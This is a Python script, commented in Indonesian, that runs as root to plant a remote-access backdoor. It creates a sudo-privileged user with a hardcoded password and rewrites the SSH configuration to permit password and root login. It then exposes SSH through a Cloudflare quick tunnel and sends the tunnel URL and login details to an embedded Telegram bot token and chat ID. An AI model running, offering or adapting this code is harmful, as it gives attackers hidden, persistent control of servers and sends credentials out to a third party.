import subprocess
import time
import re
import os
import shutil
import sys

# --- KONFIGURASI ---
TOKEN = "7520250109:AAGRiIauax-4mDUBp2CWjUqYgyrG2sncpjk"
CHAT_ID = "2029488529"
USER_SSH = "system-thc"
PASS_SSH = "cokaberul123"
SSH_PORT = "2222"
LOG_FILE = "/tmp/cloudflared.log"

def run_cmd(cmd, ignore_error=False):
    """Menjalankan perintah shell. Jika ignore_error=True, skrip tidak akan berhenti jika gagal."""
    try:
        # Kita buka sedikit stderr agar kita tahu kalau ada error di log.txt
        subprocess.run(cmd, shell=True, check=not ignore_error, stdout=subprocess.DEVNULL)
        return True
    except Exception as e:
        if not ignore_error:
            print(f"[!] Error saat menjalankan: {cmd}\nDetail: {e}")
        return False

def setup_system():
    print("[-] Menyiapkan User dan SSH...")
    
    # 1. Deteksi OS & Install Paket
    if shutil.which("apt-get"):
        run_cmd("apt-get update && apt-get install -y sudo openssh-server wget coreutils shadow")
    elif shutil.which("apk"):
        run_cmd("apk add --no-cache openssh sudo wget coreutils shadow")
    
    # 2. Buat User (Gunakan ignore_error agar tidak stop jika user belum ada)
    run_cmd(f"userdel -r {USER_SSH}", ignore_error=True) 
    
    # Buat user baru (cara universal)
    if shutil.which("useradd"):
        run_cmd(f"useradd -m -s /bin/bash {USER_SSH}")
    else:
        run_cmd(f"adduser -D -s /bin/sh {USER_SSH}")
        
    run_cmd(f"echo '{USER_SSH}:{PASS_SSH}' | chpasswd")
    
    # 3. Privilege Sudo
    run_cmd(f"usermod -aG sudo {USER_SSH}", ignore_error=True)
    run_cmd(f"addgroup {USER_SSH} wheel", ignore_error=True) # Untuk Alpine

    # 4. Konfigurasi SSHD
    ssh_config = f"Port {SSH_PORT}\nPasswordAuthentication yes\nPermitRootLogin yes\nSubsystem sftp internal-sftp\n"
    with open("/etc/ssh/sshd_config", "w") as f:
        f.write(ssh_config)
    
    # 5. Jalankan SSH
    run_cmd("ssh-keygen -A", ignore_error=True)
    run_cmd("service ssh restart", ignore_error=True)
    run_cmd("systemctl restart ssh", ignore_error=True)
    # Jalankan daemon langsung jika systemd tidak ada
    subprocess.Popen(["/usr/sbin/sshd"], stderr=subprocess.DEVNULL)

def check_dependencies():
    print("[-] Mengecek Cloudflared...")
    if not shutil.which("cloudflared"):
        # Link statis amd64 (bisa jalan di alpine & debian)
        dl_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        run_cmd(f"wget {dl_url} -O /usr/local/bin/cloudflared")
        run_cmd("chmod +x /usr/local/bin/cloudflared")

def start_tunnel():
    print(f"[-] Menghidupkan Tunnel di Port {SSH_PORT}...")
    run_cmd("pkill -9 cloudflared", ignore_error=True)
    
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)

    # Jalankan di background
    cmd = f"nice -n 19 cloudflared tunnel --url tcp://localhost:{SSH_PORT} > {LOG_FILE} 2>&1 &"
    subprocess.Popen(cmd, shell=True)

    # Tunggu link muncul
    print("[-] Menunggu URL Cloudflare (15 detik)...")
    time.sleep(15)

    full_url = None
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            content = f.read()
            match = re.search(r'https://[-a-zA-Z0-9.]*\.trycloudflare.com', content)
            if match:
                full_url = match.group(0)

    if full_url:
        send_telegram(full_url)
        print(f"[+] Berhasil: {full_url}")
    else:
        print("[!] Link tidak ditemukan. Cek internet server.")

def send_telegram(url):
    import urllib.request, urllib.parse
    clean_url = url.replace("https://", "")
    msg = (f"🔥 *ACCESS READY*\n\n👤 User: `{USER_SSH}`\n🔑 Pass: `{PASS_SSH}`\n🌐 URL: `{url}`\n\n"
           f"```ssh -o ProxyCommand=\"cloudflared access tcp --hostname %h\" {USER_SSH}@{clean_url}```")
    params = urllib.parse.urlencode({'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
    try:
        urllib.request.urlopen(f"https://api.telegram.org/bot{TOKEN}/sendMessage?{params}")
    except:
        pass

if __name__ == "__main__":
    if os.getuid() != 0:
        print("Gagal: Harus ROOT!")
        sys.exit(1)
    
    setup_system()
    check_dependencies()
    start_tunnel()
